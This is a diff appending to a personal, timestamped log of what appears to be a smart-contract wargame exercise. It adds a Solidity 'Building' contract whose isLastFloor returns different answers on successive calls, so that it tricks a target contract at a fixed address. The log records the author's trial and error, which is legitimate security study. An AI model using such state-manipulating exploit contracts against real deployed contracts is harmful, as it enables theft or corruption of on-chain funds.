@@ -76,3 +76,35 @@ contract Building {
 
 220314 13:14 KST
 okay. try the one above. the moment of truth.
+
+
+
+220314 13:17 KST
+Hm...  the counter is two. it means the function really was called twice.  I will have to
+be specific in the if condition.
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Building {
+  uint256 public counter;
+  address public target = 0xC40561420EE3774Bd187aFacAC6AaB471917b4c9;
+  function isLastFloor(uint _haha) external returns (bool) {
+      if(_haha == 3 && counter == 0) {
+          counter +=1;
+          return false;
+      }
+
+      if(_haha == 3 && counter ==1) {
+          return true;
+      }
+  }
+
+  function goTo(uint _haha) external {
+      (bool success , ) = target.call(abi.encodeWithSignature("goTo(uint256)", _haha));
+      require(success, "haha");
+  }
+}
+
+220314 13:17 KSt. Let's try above.
